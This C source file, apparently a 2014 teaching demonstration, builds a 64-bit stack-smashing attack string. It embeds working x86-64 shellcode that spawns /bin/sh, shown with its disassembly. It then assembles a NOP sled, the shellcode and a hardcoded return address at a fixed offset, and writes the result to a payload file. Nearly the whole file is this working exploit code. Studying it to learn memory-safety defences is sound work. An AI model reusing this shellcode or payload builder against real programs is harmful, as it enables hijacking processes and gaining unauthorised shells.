/** lexploit64.c
  Coded by Fanping Zeng. 12/06/2014 
  To show to smash a buffer to obtain a shell.
  gcc -o lexploit64 ../lexploit64.c
*/
//====================================================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//=============================================================================
// The shellcode is to abtain a shell (/bin/sh) in the target process space.
// You can test it by ((void (*)())shellcode)().
//=============================================================================
/*
  400733:	48 31 db             	xor    %rbx,%rbx
  400736:	48 31 d2             	xor    %rdx,%rdx
  400739:	48 b8 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rax
  400740:	2f 73 68 
  400743:	52                   	push   %rdx
  400744:	50                   	push   %rax
  400745:	48 89 e7             	mov    %rsp,%rdi
  400748:	52                   	push   %rdx
  400749:	57                   	push   %rdi
  40074a:	48 89 e1             	mov    %rsp,%rcx
  40074d:	48 89 e6             	mov    %rsp,%rsi
  400750:	48 8d 42 3b          	lea    0x3b(%rdx),%rax
  400754:	0f 05                	syscall 
*/
char shellcode[] = 
"\x48\x31\xdb"  //xor    %rbx,%rbx
"\x48\x31\xd2"  //xor    %rdx,%rdx
"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  //movabs $0x68732f6e69622f2f,%rax
"\x52"              //push   %rdx
"\x50"              //push   %rax
"\x48\x89\xe7"      //mov    %rsp,%rdi
"\x52"              //push   %rdx
"\x57"              //push   %rdi
"\x48\x89\xe1"      //mov    %rsp,%rcx
"\x48\x89\xe6"      //mov    %rsp,%rsi
"\x48\x8d\x42\x3b"  //lea    0x3b(%rdx),%rax
"\x0f\x05";         //syscall 

//=============================================================================
// If the target process has a big buffer( say 512 bytes),
// then you can put the shellcode at the behind of the buffer.
// The attack string looks like [NOP......NOP shellcode RET NOP ...... NOP ].
//=============================================================================
#define LBUFF_LEN 512
#define BUFFER_ADDRESS 0x7fffffff0000  // start address of buffer
#define OFF_SET 536
#define ATTACKSTR_LENGTH 1024
void get64Shell_By_SmashBuffer()
{
    FILE *badfile;
    int i,j,len,start;
    unsigned long * ptr ;
    char attackStr[ATTACKSTR_LENGTH+1];

    //==========================================================================
    // 
    memset(attackStr, 0x90, ATTACKSTR_LENGTH);
    attackStr[ATTACKSTR_LENGTH]='\0';
    //printf("Length=%d.\n", strlen(attackStr));

    printf("\nGet a shell by smash a buffer.\n");
    printf("\tYou should put the Shellcode on the proper position of the attack string).\n");

    len=strlen(shellcode);

    ptr=(unsigned long *)(attackStr+OFF_SET);
    *ptr = BUFFER_ADDRESS + 0x100;

    start = LBUFF_LEN - strlen(shellcode) - 0x10; // offset of shellcode in the attackStr

    for(i=0;i<len;i++)
    {
        attackStr[i+start]=shellcode[i];
    }

    // Save the attack string for latter use.
    printf("get64Shell_By_SmashBuffer():\n\tLength of attackStr=%d RETURN=%p.\n",(int)strlen(attackStr), ptr);
    printf("\tThe attack string is stored in SmashBuffer.data.\n");
    badfile = fopen("./SmashBuffer.data", "w");
    fwrite(attackStr, strlen(attackStr), 1, badfile);
    fclose(badfile);

    //    printf("If the program is correct, then you will not see this line.\n");
}

//* ===================================================================== */
/* Main                                                                  */
/* ===================================================================== */
void main(int argc, char * argv[])
{
    get64Shell_By_SmashBuffer();
}



